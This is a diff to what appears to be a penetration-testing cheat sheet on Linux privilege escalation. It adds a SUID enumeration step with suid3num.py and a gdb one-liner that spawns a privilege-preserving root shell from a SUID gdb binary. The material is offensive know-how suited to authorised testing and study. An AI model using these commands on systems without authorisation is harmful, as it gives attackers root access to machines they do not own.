@@ -2010,6 +2010,24 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 * Exploit-DB, Google, and GitHub are good places to search!
 * Check GTFO Bins and Google for SUID/SGID!!!
 
+#### SUID3NUM
+
+Use `suid3num.py` to enumerate SUID binaries and identify entries that have a GTFOBins technique:
+
+```bash
+chmod +x suid3num.py
+python3 suid3num.py
+```
+
+#### SUID GDB
+
+If `/usr/bin/gdb` is SUID root, use its embedded Python support to replace the debugger with a shell while preserving the effective UID:
+
+```bash
+/usr/bin/gdb -q -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+id
+```
+
 ### Openssl SUID/Sudo File Read
 
 If `openssl` has the SUID bit set or is allowed via sudo, use it to read privileged files:
